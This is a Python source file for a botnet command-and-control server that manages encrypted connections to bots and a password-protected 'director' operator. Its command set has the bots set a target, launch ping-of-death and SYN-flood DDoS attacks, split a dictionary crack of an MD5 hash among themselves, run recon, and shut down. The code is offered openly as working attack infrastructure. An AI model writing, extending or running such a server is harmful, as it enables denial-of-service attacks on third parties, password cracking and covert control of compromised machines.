#from rsa import *
import rsa
import socket
import select
from bot import encrypt, decrypt, pad16, depad16
from Crypto.Cipher import AES
import base64
import sys
import hashlib
# for niceness ######################################################
import sys
from colorama import init
from termcolor import cprint
from pyfiglet import figlet_format

init(strip=not sys.stdout.isatty()) # strip colors if stdout is redir.

#####################################################################


'''
BROADCASTING FUNCTION
---------------------

(1) This C&C server will work like a chat room.
Once a client sends us data to post, the server will send (forward)
the data to all active clients except for the sending client. This will be done with either CHEAP RSA enryption or AES depending on what the client has chosen. Each client comes up with their own AES shared secret and gives it to the server to be stored in a keyring bound to the client's identity.

AES shared secret exchange is done using CHEAP RSA. This means the client uses the server's public key to encrypt and send the shared secret to the server.

(2) Data section of TCP packet will be encrypted using AES.

(3) Director login password stored as hash. 
'''
def broadcast_command(message):
	# the conditional in this FOR loop is so that we do not send this message
	# to either the master socket or the sending client.
	for sock in ACTIVE_CONNECTIONS_LIST:
		if sock != director_socket and sock != master_socket:
			fd = sock.fileno()
			try:
				print "[DEBUG] encrypting and sending {} on connection {}".format(message, fd)
				encrypt_and_send(sock, message)
				print "[DEBUG] returned from encrypt_and_send() in broadcasting function."
			except:
				# this exception handles broken connections which
				# are just assumed to be closed by client.
				print "[-] ERROR: FAILED TO TRANSMIT."
				fd = sock.fileno()
				sock.close()
				ACTIVE_CONNECTIONS_LIST.remove(sock)
				#del ACTIVE_CONNECTIONS_KEYRING[fd]
				del ACTIVE_CONNECTIONS_KEYRING_AES[fd]
				sys.exit()

def broadcast_crack(hvalue):
	chunk_size = WLIST_SIZE/len(BOTS_ONLINE)
	loc = 0
	for sock in ACTIVE_CONNECTIONS_LIST:
		if sock != director_socket and sock != master_socket:
			a = loc
			loc = loc + chunk_size
			b = loc - 1
			fd = sock.fileno()
			try:
				message_1 = 'CRACKR100 ' + hvalue + ' ' + str(a) + ' ' + str(b)
				# AES
				print "[DEBUG] encrypting and sending {} on connection {}".format(message_1, fd)
				encrypt_and_send(sock, message_1)
				print "[DEBUG] returned from encrypt_and_send() in broadcasting function."
			except:
				# this exception handles broken connections which
				# are just assumed to be closed by client.
				print "[-] ERROR: FAILED TO TRANSMIT."
				fd = sock.fileno()
				sock.close()
				ACTIVE_CONNECTIONS_LIST.remove(sock)
				#del ACTIVE_CONNECTIONS_KEYRING[fd]
				del ACTIVE_CONNECTIONS_KEYRING_AES[fd]
				sys.exit()




def process_response(sock, response):
	print "[*] processing BOT response code..."
	'''
	This should call the relay_info function to communicate
	the bot response along with the identity of the bot.
	
	- SETTAR100 <IP>	----> SETTAR200 OR SETTAR500

	- DOSPOD100		 	----> DOSPOD200 OR DOSPOD500

	- DOSSYN100		 	----> DOSSYN200 OR DOSSYN500

	- CRACKR100	<HVAL> <a> <b>	----> CRACKR200 <RESULT> OR CRACKR500

	- KILLUR100			----> IAMDED200	OR IAMDED500

	- RECONR100 		----> RECONR200 <STRING> OR RECONR500	

	'''
	RESPONSE_LIST = ['SETTAR200', 'SETTAR500', 'DOSPOD200', 'DOSPOD500',
					 'DOSSYN200', 'DOSSYN500', 'CRACKR200', 'CRACKR500',
						'IAMDED200', 'IAMDED500', 'RECONR200', 'RECONR500']
	
	response_tok = response.split(' ')


	
	if response_tok[0] in RESPONSE_LIST:
		if response_tok[0] == 'IAMDED200':
			BOTS_ONLINE.remove(sock)
		print "[*] relaying status {} from bot {}".format(response_tok[0], sock.fileno())
		encrypt_and_send(director_socket, response + ' ' + str(sock.fileno()))
	


def process_command(d_sock, command):
	print "[*] processing command from director."
	'''
					AVAILABLE COMMANDS
                  ------------------
                      - LIST:				BOTSON100						list all bots online
                      
                      - TARGET xx.xx.xx.xx:	SETTAR100 <IP> 					set target for all bots
                      
                      - DDOS POD:			DOSPOD100						launch ping of death attack on target from all online bots
                      
                      - DDOS SYN            DOSSYN100						launch syn flood attack on target from all online bots
      
                      - CRACK               CRACKR100 <hash>  				perform test bruteforce dictionary attack on md5 hash.
                                                 							 mainly as a proof-of-concept but can be extended to serve
                                            							      actual functionality.
  
                      - KILL <BOT#>         KILLBO100 <BOT ID> 			   	kill bot with assigned number
  
                      - KILL ALL            KILLAL100 					    kill all bots.  
				
					  - RECON <BOT#>		RECONR100 <BOT ID>

	'''
	command_tok = command.split(" ")
	print "[DEBUG] processing command {}".format(command_tok)
	if command_tok[0] == 'BOTSON100':
		print "[*] sending list of online bots."
		temp = []
		#[temp.append( str(x.getpeername()) ) for x in BOTS_ONLINE]
		[temp.append( 'ID#[{}] {}'.format(x.fileno(), str(x.getpeername()))) for x in BOTS_ONLINE]
		m = '|'.join(temp)
		m = 'BOTSON200 ' + m
		print "[DEBUG] sending bot list: {}".format(m)
		encrypt_and_send(d_sock, m)
		return 'NO_BROADCAST'	

	if command_tok[0] == 'SETTAR100':
		print '[*] relaying target to bots.'
		return command
	
	if command_tok[0] == 'DOSPOD100':
		print '[*] broadcasting DDOS POD request to bots...'
		return command
	
	if command_tok[0] == 'DOSSYN100':
		print '[*] broadcasting DDOS SYN request to bots...'
		return command

	if command_tok[0] == 'CRACKR100':
		print '[*] PROCESSING CRACK REQUEST...'
		print "[DEBUG] CALLING broadcast_crack with arg: {}".format(command_tok[1])
		broadcast_crack(command_tok[1])
		return 'NO_BROADCAST'

	if command_tok[0] == 'KILLBO100':
		print '[*] sending kill signal to BOT {}'.format(command_tok[1])
		encrypt_and_send(ACTIVE_CONNECTIONS_FDMAP[int(command_tok[1])], 'KILLUR100')
		return 'NO_BROADCAST'	
	
	if command_tok[0] == 'KILLAL100':
		print "[*] broadcasting kill request to all active bots..."		
		return 'KILLUR100'

	if command_tok[0] == 'RECONR100':
		print '[*] sending recon request to BOT {}'.format(command_tok[1])
		encrypt_and_send(ACTIVE_CONNECTIONS_FDMAP[int(command_tok[1])], 'RECONR100')
		return 'NO_BROADCAST'
	
	print "[-] ERROR: UNRECOGNIZED MESSAGE."
	return 'NO_BROADCAST'	

	
def encrypt_and_send(sock, message):
	fd = sock.fileno()
	print "[DEBUG] called sock.fileno in encrypt_and_send() function."
	if fd in ACTIVE_CONNECTIONS_KEYRING_AES:
		print "\n[*] broadcasting using AES on connection {}".format(fd)
		message_1 = pad16(message)
		sock.send('E'+base64.b64encode(ACTIVE_CONNECTIONS_KEYRING_AES[fd][0].encrypt(message_1)))
	else:
		print "[-] ERROR: in encrypt_and_send, socket not found in keyring."




'''
LOGIN FUNCTION
--------------

'''
def login(pw_attempt, DIRECTOR_PW):
	return (hashlib.sha256(pw_attempt).hexdigest() == DIRECTOR_PW )


if __name__=="__main__":
	DEBUG = 0
	# DEFINITIONS (global := capitalization)
	NO_ENCRYPTION = 0
	#########################################
	'''
	USEFUL STRUCTURES
	------------------
	'''
	ACTIVE_CONNECTIONS_LIST = []
	ACTIVE_CONNECTIONS_FDMAP = {}
	#ACTIVE_CONNECTIONS_KEYRING = {}
	ACTIVE_CONNECTIONS_KEYRING_AES = {}
	BOTS_ATTACKING = []
	BOTS_ONLINE = []
	########################################
	WLIST_SIZE	= 306757
	DIRECTOR_PW = 'd65c71f8c231973d8f769a402892bd1ae8135adf24c8c1f6966b124d09682a9c'	
	BUFFER_RECV = 16384
	PORT = 1337
	IP = '0.0.0.0'
	KEY_SIZE = 1024
	#SHA256
	director_socket = 0
	
	if len(sys.argv) > 1:
		if sys.argv[1] == 'NO_ENCRYPTION':	
			NO_ENCRYPTION = 1

	server_public, server_private = rsa.newkeys(KEY_SIZE)

	public_message = 'PUBKEY200 '+ str(server_public.n) + ' ' + str(server_public.e)	

	master_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	# needed?
	master_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	master_socket.bind((IP, PORT))
	master_socket.listen(10)

	# add master socket to active connections list A(readable sockets)
	ACTIVE_CONNECTIONS_LIST.append(master_socket)
	ACTIVE_CONNECTIONS_FDMAP[master_socket.fileno()] = master_socket
	print "\n[*] started C&C server on port {}.\n".format(PORT)

	print "----------------------------------------------------------------------"
	print "----------------------------------------------------------------------\n"
	cprint(figlet_format('C&C\n SERVER', font='colossal'), 'red', attrs=['bold'])
	print "----------------------------------------------------------------------"
	print "----------------------------------------------------------------------"

	if NO_ENCRYPTION:
		print "*** WARNING: running in plaintext mode (no encryption used, bots will not process commands!). ***"

	# start main loop
	while True:
		###########################################################
		# retrieve list of sockets ready to be read using select()
		read_soccs, write_soccs, error_soccs = select.select(ACTIVE_CONNECTIONS_LIST, [], [])
		
		###########################################################
		for socc in read_soccs:
			# case [1]: NEW CONNECTION
			if socc == master_socket:
				# here a new connection is received at the master (server) socket
				socketfd, addr = master_socket.accept()
				ACTIVE_CONNECTIONS_LIST.append(socketfd)
				ACTIVE_CONNECTIONS_FDMAP[socketfd.fileno()] = socketfd
				print "\n[+] bot <%s, %s> has connected. Added to active connections list." % addr
				
				#socketfd.send("LOGRDY")	
				# [1a] send server public key to new client:
				socketfd.send(public_message)
				# announce client entry to room.
				m = "\n[+] BOT {} HAS JOINED YOUR ARMY.\n".format(addr)
				if (director_socket != 0):
					director_socket.send(m)
				#else:
				BOTS_ONLINE.append(socketfd)
				#broadcast_command(socketfd, m)

			# case [2]: MESSAGE received from existing client.
			else:
				# process data received.
				# try/catch block for robustness.
				try:
					data = socc.recv(BUFFER_RECV)
					if data:
						data_tok = data.split(' ')
						# HANDLE FORMATTED MESSAGES FOR KEY EXCHANGE
						if data_tok[0] == 'PUBKEY200':
							# proto for adding public key
							n_client = int(data_tok[1])
							e_client = int(data_tok[2])
							fd = socc.fileno()
							ACTIVE_CONNECTIONS_KEYRING[int(fd)] = publicKey(n = n_client, e = e_client)
							print "\n[*] public key {} added to keyring for connection {}.".format(ACTIVE_CONNECTIONS_KEYRING[fd], fd)
							socc.send("\n[**] server has received your public key.\n")
							print "\n[*] GOT KEY."
						elif data_tok[0] == 'AESKEY200':
							# proto for adding AES shared key
							if DEBUG:
								print '1 - AESKEY200'
							#key_iv_client = decrypt(' '.join(data_tok[1:]), server_private)
							#if DEBUG:
								#print '1a - decrypted: {}'.format(key_iv_client)
							#key_iv_client = ''.join(data_tok[1:])
							#key_iv_client = key_iv_client.split('@!delim!@')
							#if DEBUG:
								#print '1b - split: {}'.format(key_iv_client)
							key_client = decrypt(base64.b64decode(data_tok[1]), server_private)
							if DEBUG:
								print '2 - key len: {}'.format(len(key_client))
							iv_client = decrypt(base64.b64decode(data_tok[2]), server_private)
							if DEBUG:
								print '3 - iv len: {}'.format(len(iv_client))
							fd = socc.fileno()
							if DEBUG:
								print fd
													
							# tuple for encryption and decryption
							# in stored tuple: first element is for encryption, second is for decryption.
							ACTIVE_CONNECTIONS_KEYRING_AES[int(fd)] = (AES.new(key_client, AES.MODE_CBC, iv_client), AES.new(key_client, AES.MODE_CBC, iv_client) )
							print "\n[*] shared key {} added to AES keyring for connection {}.".format(ACTIVE_CONNECTIONS_KEYRING_AES[fd], fd)
							socc.send("\n[**] server has received your AES key.\n")
							
							# SANITY CHECK
							#if DEBUG:
							test 	= 'dog'
							entest 	= ACTIVE_CONNECTIONS_KEYRING_AES[int(fd)][0].encrypt(pad16(test))
							print '[CHECK] ISSUE WITH ENCRYPTION?'
							detest 	= ACTIVE_CONNECTIONS_KEYRING_AES[int(fd)][1].decrypt(entest)
							print "[CHECK] detest type: {}".format(type(detest))
							detestupad	= depad16(detest)
							print "[CHECK] SANITY CHECK: [{}] ENCRYPTS TO [{}]".format(test, entest)
							print "[CHECK] which decrypts to [{}]".format(detestupad)
		
							print "\n[*] GOT AES KEY."
						
						elif data_tok[0] == 'DIRLOG200':
							if fd in ACTIVE_CONNECTIONS_KEYRING_AES:
								if DEBUG:
									print "[DEBUG] in DIRLOG check, data_tok: <{}>".format(data_tok)
								de_message = ''.join(data_tok[1:])
								de_message = ACTIVE_CONNECTIONS_KEYRING_AES[fd][1].decrypt(base64.b64decode(de_message)) 
								if DEBUG:
									print "raw decrypted AES password is: [{}]".format(de_message)
								de_message = depad16( de_message )
								#if DEBUG:
									#print "broadcasting [{}] using AES keyring.".format(de_message)
								# check login info
								print "checking pw: {}".format(de_message)
								login_result = login(de_message, DIRECTOR_PW)
								if (login_result):
									print "[+] director logged in."
									director_socket = socc
									director_socket.send("DIRLOG200 ")
									if (director_socket in BOTS_ONLINE):
										BOTS_ONLINE.remove(director_socket)
									temp = []
									#[temp.append( str(x.getpeername()) ) for x in BOTS_ONLINE]
									[temp.append( 'ID#[{}] {}'.format(x.fileno(), str(x.getpeername()))) for x in BOTS_ONLINE]
									if DEBUG:
										print "[DEBUG] BOTS_ONLINE: {}".format(BOTS_ONLINE)
										print "[DEBUG] sending bot list: {}".format(temp)

									notification = "BOTSON200 " + "|".join(temp)

									if DEBUG:
										print "[DEBUG] sending bot list afetr format: {}".format(notification)	
									# notify director of available online bots
									encrypt_and_send(director_socket, notification)
								else:
									socc.send("DIRLOG500 ")
								#process_response(socc, de_message )
							else:
								print "[-] ERROR: received encrypted message from connection not in AES keyring."
								socc.send("DIRLOG500")
	


						else:
							if data[0] == 'E':
								if DEBUG:
									print "received message [{}] of lenght: {}".format(data, len(data))
								fd = socc.fileno()
								if fd in ACTIVE_CONNECTIONS_KEYRING_AES:
									de_message = ACTIVE_CONNECTIONS_KEYRING_AES[fd][1].decrypt(base64.b64decode(data[1:])) 
									if DEBUG:
										print "raw decrypted AES message is: [{}]".format(de_message)
									de_message = depad16( de_message )
									#if DEBUG:
										#print "broadcasting [{}] using AES keyring.".format(de_message)
									if socc == director_socket:
										command_processed = process_command(director_socket, de_message)
										if command_processed != 'NO_BROADCAST': # if then no need to broadcast
											if DEBUG:
												print "[DEBUG] broadcasting <{}>".format(command_processed)
											broadcast_command(command_processed) # if from director, broadcast to bots.
									else: 
										process_response(socc, de_message ) # if from bot, process response and use relay function to communicate results with director.
								else:
									print "[-] ERROR: received encrypted message from connection not in AES keyring."
							else:
								#broadcast_command(socc, "\r"+str(socc.getpeername())+" -> "+ data)
								print "[?] received unencrypted data: {}".format(data)
				
				except:
					en_message = "\n[-] bot <{}> has LEFT the army.\n".format(addr)	
					broadcast_command(en_message) 
					print "\n[-]client <%s:%s> has gone offline.\n" % addr
					fd = socc.fileno()
					socc.close()
					ACTIVE_CONNECTIONS_LIST.remove(socc)
					#del ACTIVE_CONNECTIONS_KEYRING[fd]
					#del ACTIVE_CONNECTIONS_KEYRING_AES[fd]	
					continue

			
	master_socket.close()


#if __name__ == "__main__": main()
